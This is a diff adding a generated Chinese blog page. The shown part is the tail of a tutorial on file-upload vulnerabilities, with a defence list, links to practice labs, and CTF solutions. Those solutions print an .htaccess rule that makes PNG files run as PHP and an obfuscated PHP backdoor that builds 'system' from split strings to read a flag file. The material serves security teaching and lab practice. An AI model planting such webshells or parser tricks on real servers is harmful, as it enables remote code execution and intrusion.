+<li>检测 Token 防 CSRF 重放</li>
+</ul>
+<p><strong>Web 容器 &#x2F; 系统层面：</strong></p>
+<ul>
+<li>及时更新 Web 容器，禁用 PUT 方法</li>
+<li>避开空格、<code>.</code>、<code>::$DATA</code> 等系统特性</li>
+<li>执行权限与写权限分离，站库分离</li>
+</ul>
+<p><strong>业务层面：</strong></p>
+<ul>
+<li>强口令策略，避免攻击者登录后台</li>
+<li>避免 Web 用户修改上传白名单</li>
+</ul>
+<hr>
+<h2 id="八、靶场练习"><a href="#八、靶场练习" class="headerlink" title="八、靶场练习"></a>八、靶场练习</h2><ul>
+<li><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E9%9D%B6%E6%9C%BA/%E4%B8%93%E9%A1%B9%E7%BB%83%E4%B9%A0/upload-labs/upload-labs.md">upload-labs 专项靶场</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZhaoSong_/article/details/132326413">DVWA File Upload</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZhaoSong_/article/details/132379331">Pikachu Unsafe File Upload</a></li>
+<li><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/weblogic-CVE-2018-2894-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md">weblogic-CVE-2018-2894-任意文件上传漏洞复现</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_68233961/article/details/129212413">CTFSHOW 151-161</a> | <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1pQ4y1s7kH?p=32">B 站</a></li>
+</ul>
+<blockquote>
+<p>js 验证、mime、<code>.user.ini</code>：后门代码需特定格式后缀才能解析。图片后缀里的 PHP 代码无法直接触发，需配合包含漏洞 &#x2F; 解析漏洞 &#x2F; <code>.user.ini</code> &#x2F; <code>.htaccess</code>。</p>
+</blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_68233961/article/details/129212413">CTFSHOW 162-170</a> | <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1pQ4y1s7kH?p=33">B 站</a></li>
+</ul>
+<blockquote>
+<p>二次渲染、<code>.htaccess</code>、变异免杀。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40800734/article/details/105920149">二次渲染参考</a></p>
+</blockquote>
+<p><strong>167 — .htaccess 妙用：</strong></p>
+<p><code>.htaccess</code> 默认不支持 Nginx，Apache 下可将 <code>.png</code> 当 PHP 解析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/file-upload/Pasted%20image%2020260626214644.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/Pasted%20image%2020260626214644.png"  alt=".htaccess 1" lazyload></a><br><a class="simple-lightbox" href="/imgs/file-upload/Pasted%20image%2020260626214601.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/Pasted%20image%2020260626214601.png"  alt=".htaccess 2" lazyload></a><br><a class="simple-lightbox" href="/imgs/file-upload/Pasted%20image%2020260626214607.png"><img   src="/images/loading.svg" data-src="/imgs/file-upload/Pasted%20image%2020260626214607.png"  alt=".htaccess 3" lazyload></a></p>
+<p><strong>168 — 免杀后门：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;m&#x27;</span>;<span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$c</span>(<span class="string">&#x27;tac ../flagaa.php&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;<span class="variable">$a</span>(<span class="string">&#x27;tac ../flag.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<blockquote>
+<p><strong>文件上传的终点不是文件落地，是代码被执行。</strong> 绕过上传只是第一步——中间件把它当脚本跑才是关键，这一环靠解析漏洞和 <code>.htaccess</code>。</p>
+</blockquote>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0"><span class="top-box-text">一、概述</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-1-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="top-box-text">1.1 是什么</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-2-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="top-box-text">1.2 漏洞成因</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-3-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF"><span class="top-box-text">1.3 挖掘思路</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%8C%E3%80%81DVWA-%E6%94%BB%E9%98%B2%E9%80%92%E8%BF%9B"><span class="top-box-text">二、DVWA 攻防递进</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-1-Low-%E2%80%94-%E6%97%A0%E6%A3%80%E6%B5%8B"><span class="top-box-text">3.1 Low — 无检测</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-2-Medium-%E2%80%94-Content-Type-%E6%A3%80%E6%B5%8B"><span class="top-box-text">3.2 Medium — Content-Type 检测</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-3-High-%E2%80%94-%E5%90%8E%E7%BC%80%E5%90%8D-%E5%9B%BE%E7%89%87%E5%A4%B4"><span class="top-box-text">3.3 High — 后缀名 + 图片头</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-4-%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC"><span class="top-box-text">3.4 图片木马</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-5-Impossible-%E2%80%94-%E5%AE%8C%E5%85%A8%E9%98%B2%E5%BE%A1"><span class="top-box-text">3.5 Impossible — 完全防御</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%9B%9B%E3%80%81%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%AD%96%E7%95%A5"><span class="top-box-text">四、黑白名单策略</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%94%E3%80%81%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8"><span class="top-box-text">五、绕过手法大全</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-1-%E5%89%8D%E7%AB%AF-JS-%E6%A0%A1%E9%AA%8C-%E2%86%92-%E7%9B%B4%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="top-box-text">5.1 前端 JS 校验 → 直接绕过</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-2-Content-Type-%E2%86%92-%E6%94%B9%E5%A4%B4"><span class="top-box-text">5.2 Content-Type → 改头</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-3-%E9%BB%91%E5%90%8D%E5%8D%95%E5%90%8E%E7%BC%80-%E2%86%92-%E6%8D%A2%E4%B8%80%E4%B8%AA"><span class="top-box-text">5.3 黑名单后缀 → 换一个</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-4-%E7%99%BD%E5%90%8D%E5%8D%95-%E2%86%92-00-%E6%88%AA%E6%96%AD%EF%BC%88PHP-5-3-4%EF%BC%89"><span class="top-box-text">5.4 白名单 → %00 截断（PHP &lt; 5.3.4）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-5-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B-%E2%86%92-%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="top-box-text">5.5 文件头检测 → 图片马</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-6-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4-%E2%86%92-%E6%8D%A2%E5%86%99%E6%B3%95"><span class="top-box-text">5.6 文件内容关键字过滤 → 换写法</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-7-htaccess%EF%BC%88Apache%EF%BC%89"><span class="top-box-text">5.7 .htaccess（Apache）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-8-user-ini%EF%BC%88Nginx-IIS%EF%BC%89"><span class="top-box-text">5.8 .user.ini（Nginx &#x2F; IIS）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-9-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="top-box-text">5.9 条件竞争</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-10-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="top-box-text">5.10 二次渲染绕过</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AD%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="top-box-text">六、中间件解析漏洞</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%83%E3%80%81%E9%98%B2%E5%BE%A1"><span class="top-box-text">七、防御</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AB%E3%80%81%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0"><span class="top-box-text">八、靶场练习</span></a></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2026/06/28/open-redirect/">
+          <h3 class="post-title">
+            
+            下一篇：URL 重定向（开放重定向）
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/z50n6" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+    
+     |
+    
+      <a href="/atom.xml" target="_blank">RSS</a>
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"lazyload_placeholder":null,"photo_zoom":"simple-lightbox"},"search":{"enable":true,"type":"json","placeholder":"输入关键词搜索...","algolia":{"appID":"","apiKey":"","indexName":""}},"language":"zh-CN"}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
+</html>
+
